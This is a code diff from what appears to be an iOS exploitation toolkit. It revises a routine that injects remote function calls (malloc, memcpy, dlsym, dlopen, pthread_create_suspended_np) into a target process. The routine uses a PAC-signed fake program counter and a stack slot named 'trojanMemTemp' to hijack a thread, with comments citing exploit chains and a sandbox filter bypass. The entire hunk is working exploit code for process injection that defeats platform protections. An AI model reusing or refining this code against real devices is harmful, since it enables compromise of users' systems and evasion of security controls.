@@ -2011,87 +2011,40 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     bool createdSuspended = false;
 
     if (!ios26StubPthread) {
-        // Fl0rk: out = SP-0x100 (trojanMemTemp). heapOut was wrong — create
-        // wrote nothing we could observe (log: krw=sb=canary). Soft-fail →
-        // thread[1]. Never unsigned sleep.
-        uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-        if (!g_RC_success || !heapBounce) {
-            RC_DIAG("malloc heapBounce failed");
-            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-            return -1;
-        }
-        if (!remote_write64(heapBounce, kCanary)) {
-            RC_DIAG("canary remote_write to heapBounce FAILED");
-            do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
-            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-            return -1;
-        }
-        // Plant canary onto live SB stack page via SB memcpy (remap≠stack).
-        do_remote_call_temp(100, "memcpy", trojanMemTemp, heapBounce, 8, 0, 0, 0, 0, 0);
-        clear_remote_shmem_cache();
-        RC_DIAG("Fl0rk out planted canary via SB memcpy out=0x%llx bounce=0x%llx",
-                (unsigned long long)trojanMemTemp, (unsigned long long)heapBounce);
-
-        uint64_t startRoutine = 0;
-        const char *startKind = "none";
-
-        // 1) remote dlsym via RTLD_DEFAULT
-        {
-            uint64_t nameBuf = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-            if (g_RC_success && nameBuf && remote_writeStr(nameBuf, "getpid")) {
-                startRoutine = do_remote_call_temp(100, "dlsym",
-                                                   (uint64_t)(int64_t)-2, nameBuf,
-                                                   0, 0, 0, 0, 0, 0);
-                if (g_RC_success && startRoutine) {
-                    startKind = "remote_dlsym_DEFAULT";
-                } else {
-                    RC_DIAG("remote dlsym(DEFAULT,getpid)=0 — try dlopen libsystem_c");
-                    startRoutine = 0;
-                    uint64_t pathBuf = do_remote_call_temp(100, "malloc", 64, 0, 0, 0, 0, 0, 0, 0);
-                    if (g_RC_success && pathBuf &&
-                        remote_writeStr(pathBuf, "/usr/lib/system/libsystem_c.dylib")) {
-                        uint64_t handle = do_remote_call_temp(100, "dlopen", pathBuf, 1 /*RTLD_LAZY*/, 0, 0, 0, 0, 0, 0);
-                        if (g_RC_success && handle) {
-                            startRoutine = do_remote_call_temp(100, "dlsym", handle, nameBuf, 0, 0, 0, 0, 0, 0);
-                            if (g_RC_success && startRoutine)
-                                startKind = "remote_dlsym_libc";
-                        }
-                        do_remote_call_temp(100, "free", pathBuf, 0, 0, 0, 0, 0, 0, 0);
-                    }
-                }
-                do_remote_call_temp(100, "free", nameBuf, 0, 0, 0, 0, 0, 0, 0);
-            }
-        }
-
-        // 2) Fl0rk-style PAC'd FAKE_PC 0x301
-        if (!startRoutine) {
-            startRoutine = remoteCrashSigned;
-            startKind = "pac_0x301";
-        }
-
-        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx",
-                startKind, (unsigned long long)startRoutine,
+        // Cyanide/Fl0rk: create IMMEDIATELY after bootstrap getpid.
+        // Prior path did malloc/memcpy/dlsym/dlopen/free BEFORE create — each
+        // remote call runs on the parked creator stack and can smash SP-0x100
+        // (log 16:32: always canary after that dance). Never unsigned sleep.
+        // start = remote_pac(0x301,0) same as Cyanide.
+        RC_DIAG("pthread_create_suspended_np start=pac_0x301 0x%llx out=SP-0x100=0x%llx (immediate)",
+                (unsigned long long)remoteCrashSigned,
                 (unsigned long long)trojanMemTemp);
 
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                    trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
+                                                    trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
         uint64_t pthreadAddr = 0;
         if (g_RC_success && createResult == 0) {
-            // Read *out via SB memcpy stack→heap (authoritative); never trust
-            // pre-create remap of stack page.
-            clear_remote_shmem_cache();
-            remote_write64(heapBounce, kCanary);
-            do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
-            clear_remote_shmem_cache();
-            pthreadAddr = remote_read64(heapBounce);
-            RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
-                    (unsigned long long)trojanMemTemp,
-                    (unsigned long long)pthreadAddr);
+            // Read *out via SB memcpy stack→heap (remap ≠ live stack page).
+            uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+            if (g_RC_success && heapBounce) {
+                remote_write64(heapBounce, kCanary);
+                do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
+                clear_remote_shmem_cache();
+                pthreadAddr = remote_read64(heapBounce);
+                RC_DIAG("post-pthread out=0x%llx sb_via_bounce=0x%llx",
+                        (unsigned long long)trojanMemTemp,
+                        (unsigned long long)pthreadAddr);
+                do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
+            } else {
+                clear_remote_shmem_cache();
+                pthreadAddr = remote_read64(trojanMemTemp);
+                RC_DIAG("post-pthread bounce miss — raw remapped read=0x%llx",
+                        (unsigned long long)pthreadAddr);
+            }
         } else {
             RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
                     (unsigned long long)createResult, (int)g_RC_success);
         }
-        do_remote_call_temp(100, "free", heapBounce, 0, 0, 0, 0, 0, 0, 0);
 
         if (pthreadAddr && pthreadAddr != kCanary) {
             callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
